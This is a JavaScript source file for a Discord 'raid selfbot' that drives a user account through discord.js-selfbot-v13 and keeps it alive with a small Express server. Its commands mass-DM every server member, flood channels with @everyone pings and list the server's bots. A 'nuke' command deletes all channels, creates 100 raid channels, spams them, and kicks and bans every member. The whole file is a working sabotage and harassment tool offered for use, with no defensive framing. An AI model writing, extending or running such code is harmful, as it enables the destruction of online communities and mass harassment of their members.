const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

// Use environment variable for security
const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Raid selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
    console.log(`Type !help for commands`);
});

// Helper function to send messages safely
async function safeSend(channel, content) {
    try {
        if (channel && !channel.deleted) {
            await channel.send(content);
        }
    } catch (error) {
        console.log(`⚠️ Could not send message: ${error.message}`);
    }
}

// ===== PERMISSION CHECK COMMAND =====
client.on('messageCreate', async (message) => {
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'checkperms') {
        const guild = message.guild;
        if (!guild) {
            await safeSend(message.channel, 'This command only works in servers!');
            return;
        }

        const member = guild.members.cache.get(client.user.id);
        
        const permissions = {
            administrator: member.permissions.has('Administrator'),
            manageChannels: member.permissions.has('ManageChannels'),
            manageMessages: member.permissions.has('ManageMessages'),
            kickMembers: member.permissions.has('KickMembers'),
            banMembers: member.permissions.has('BanMembers'),
            mentionEveryone: member.permissions.has('MentionEveryone'),
            viewChannel: member.permissions.has('ViewChannel'),
            sendMessages: member.permissions.has('SendMessages')
        };

        console.log('🔍 PERMISSION CHECK RESULTS:');
        console.log('==========================');
        for (const [perm, value] of Object.entries(permissions)) {
            console.log(`${value ? '✅' : '❌'} ${perm}: ${value}`);
        }
        console.log('==========================');

        // Determine what you can do
        let canDo = [];
        if (permissions.administrator || permissions.manageChannels) {
            canDo.push('🔴 FULL NUKE (delete/create channels)');
        }
        if (permissions.manageMessages) {
            canDo.push('🟠 Mass message delete, spam');
        }
        if (permissions.kickMembers) {
            canDo.push('🟡 Kick members');
        }
        if (permissions.banMembers) {
            canDo.push('🟢 Ban members');
        }
        if (permissions.mentionEveryone) {
            canDo.push('🔵 Mass @everyone pings');
        }
        if (permissions.sendMessages) {
            canDo.push('⚪ Channel spam');
        }

        let response = `**🔍 Permission Check Complete**\n\`\`\`\n`;
        for (const [perm, value] of Object.entries(permissions)) {
            response += `${value ? '✅' : '❌'} ${perm}\n`;
        }
        response += `\`\`\`\n**What you can do:**\n`;
        response += canDo.map(thing => `• ${thing}`).join('\n');
        
        await safeSend(message.channel, response);
    }

    // ===== MASS DM COMMAND =====
    if (command === 'massdm') {
        const guild = message.guild;
        if (!guild) return;

        await safeSend(message.channel, '📨 Starting mass DM attack...');

        const dmMessage = `@everyone **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

        let sent = 0;
        let failed = 0;
        let total = 0;

        // Get all members
        const members = [...guild.members.cache.values()];
        
        for (const member of members) {
            // Skip bots and yourself
            if (member.user.bot || member.id === client.user.id) continue;
            
            total++;
            
            try {
                await member.send(dmMessage);
                sent++;
                console.log(`✅ DM sent to ${member.user.tag}`);
                
                // Delay to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 1500));
                
            } catch (error) {
                failed++;
                console.log(`❌ Failed to DM ${member.user.tag}: ${error.message}`);
            }
        }

        console.log(`📊 Mass DM complete: ${sent} sent, ${failed} failed out of ${total} members`);
        await safeSend(message.channel, `✅ Mass DM complete! Sent: ${sent}, Failed: ${failed}`);
    }

    // ===== CHANNEL SPAM COMMAND =====
    if (command === 'spamchannel') {
        const channel = message.channel;
        
        let count = parseInt(args[0]) || 50;
        if (count > 200) count = 200;

        await safeSend(channel, `🔥 Spamming this channel ${count} times...`);

        const spamMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

        for (let i = 0; i < count; i++) {
            try {
                await channel.send(spamMessage);
                console.log(`✅ Spam message ${i+1}/${count} sent`);
                
                // Small delay to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 300));
                
            } catch (error) {
                console.log(`❌ Failed on message ${i+1}: ${error.message}`);
                break;
            }
        }

        await safeSend(channel, `✅ Spammed ${count} messages!`);
    }

    // ===== BOT SCANNER (Find vulnerable bots) =====
    if (command === 'scanbots') {
        const guild = message.guild;
        if (!guild) return;

        await safeSend(message.channel, '🔍 Scanning for bots...');

        const bots = [];
        guild.members.cache.forEach(member => {
            if (member.user.bot) {
                bots.push({
                    name: member.user.username,
                    id: member.user.id,
                    tag: member.user.tag
                });
            }
        });

        console.log('🤖 BOTS IN SERVER:');
        console.log('==================');
        bots.forEach(bot => {
            console.log(`• ${bot.name} (${bot.id})`);
        });
        console.log(`Total: ${bots.length} bots`);
        console.log('==================');

        let response = `**🔍 Found ${bots.length} bots**\n\`\`\`\n`;
        bots.forEach(bot => {
            response += `• ${bot.name}\n`;
        });
        response += `\`\`\`\nCheck if any of these are vulnerable!`;
        
        await safeSend(message.channel, response);
    }

    // ===== INTELLIGENT NUKE (Chooses best method) =====
    if (command === 'nuke') {
        const guild = message.guild;
        if (!guild) return;

        const member = guild.members.cache.get(client.user.id);
        
        // Check permissions
        const hasChannelPerms = member.permissions.has('ManageChannels') || 
                                member.permissions.has('Administrator');
        
        const hasKickPerms = member.permissions.has('KickMembers') ||
                             member.permissions.has('Administrator');
        
        const hasBanPerms = member.permissions.has('BanMembers') ||
                            member.permissions.has('Administrator');

        await safeSend(message.channel, '🎯 Analyzing server vulnerabilities...');

        console.log('='.repeat(50));
        console.log('🎯 INTELLIGENT NUKE STARTED');
        console.log(`Target: ${guild.name}`);
        console.log('='.repeat(50));

        // METHOD 1: Full channel nuke (if you have perms)
        if (hasChannelPerms) {
            console.log('✅ Have channel perms - executing FULL NUKE');
            await safeSend(message.channel, '🔴 FULL NUKE MODE: Deleting all channels...');

            // Delete all channels
            let deletedCount = 0;
            const channels = [...guild.channels.cache.values()];
            
            for (const channel of channels) {
                try {
                    await channel.delete();
                    deletedCount++;
                    console.log(`✅ Deleted: ${channel.name}`);
                    await new Promise(resolve => setTimeout(resolve, 300));
                } catch (error) {
                    console.log(`❌ Failed to delete ${channel.name}: ${error.message}`);
                }
            }
            
            console.log(`✅ Deleted ${deletedCount} channels`);

            // Create 100 raid channels
            await safeSend(message.channel, `🔥 Creating 100 raid channels...`);
            
            const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
            const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

            let createdCount = 0;
            for (let i = 1; i <= 100; i++) {
                try {
                    const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                        type: 'text'
                    });
                    await newChannel.send(raidMessage);
                    createdCount++;
                    console.log(`✅ Created channel ${i}/100`);
                    await new Promise(resolve => setTimeout(resolve, 500));
                } catch (error) {
                    console.log(`❌ Failed to create channel ${i}: ${error.message}`);
                }
            }

            console.log(`✅ Created ${createdCount} raid channels`);

        // METHOD 2: Mass DM + Spam (if no channel perms)
        } else {
            console.log('❌ No channel perms - using alternative methods');
            await safeSend(message.channel, '⚠️ No channel perms. Using mass destruction methods...');

            // Start mass DM in background (don't await)
            (async () => {
                console.log('📨 Starting mass DM attack...');
                const dmMessage = `@everyone **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

                let sent = 0;
                const members = [...guild.members.cache.values()];
                
                for (const member of members) {
                    if (member.user.bot || member.id === client.user.id) continue;
                    
                    try {
                        await member.send(dmMessage);
                        sent++;
                        console.log(`✅ DM sent to ${member.user.tag}`);
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    } catch (error) {
                        // Silently fail for DMs
                    }
                }
                console.log(`📊 Mass DM complete: ${sent} DMs sent`);
            })();

            // Spam all visible channels
            console.log('🔥 Spamming all available channels...');
            const channels = [...guild.channels.cache.values()];
            const textChannels = channels.filter(c => c.type === 'GUILD_TEXT');
            
            const spamMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

            for (const channel of textChannels) {
                try {
                    await channel.send(spamMessage);
                    console.log(`✅ Spammed in #${channel.name}`);
                    await new Promise(resolve => setTimeout(resolve, 200));
                } catch (error) {
                    console.log(`❌ Couldn't spam in #${channel.name}: ${error.message}`);
                }
            }

            // Try to kick/ban if possible
            if (hasKickPerms) {
                console.log('👢 Kicking members...');
                const members = [...guild.members.cache.values()];
                for (const member of members) {
                    if (!member.user.bot && member.id !== client.user.id) {
                        try {
                            await member.kick('Raid');
                            console.log(`✅ Kicked ${member.user.tag}`);
                            await new Promise(resolve => setTimeout(resolve, 500));
                        } catch (error) {
                            // Skip
                        }
                    }
                }
            }

            if (hasBanPerms) {
                console.log('🔨 Banning members...');
                const members = [...guild.members.cache.values()];
                for (const member of members) {
                    if (!member.user.bot && member.id !== client.user.id) {
                        try {
                            await member.ban({ reason: 'Raid' });
                            console.log(`✅ Banned ${member.user.tag}`);
                            await new Promise(resolve => setTimeout(resolve, 500));
                        } catch (error) {
                            // Skip
                        }
                    }
                }
            }
        }

        console.log('='.repeat(50));
        console.log('💀 NUKE OPERATION COMPLETE');
        console.log('='.repeat(50));
        
        // Try to send final status (if any channel exists)
        try {
            const anyChannel = guild.channels.cache.first();
            if (anyChannel) {
                await anyChannel.send('💀 **NUKE COMPLETE** - Server has been destroyed!');
            }
        } catch (error) {
            // No channels left to send message
        }
    }

    // ===== HELP COMMAND =====
    if (command === 'help') {
        const helpText = `**🔞 RAID SELFBOT COMMANDS**

**!checkperms** - Check your permissions in this server
**!scanbots** - List all bots in the server
**!massdm** - DM everyone in the server
**!spamchannel [count]** - Spam current channel
**!nuke** - Intelligent nuke (chooses best method)
**!help** - Show this message

**Tips:**
• Use !checkperms first to see what you can do
• !nuke automatically adapts to your permissions
• Without channel perms, it uses mass DM + spam`;
        
        await safeSend(message.channel, helpText);
    }
});

client.login(TOKEN);
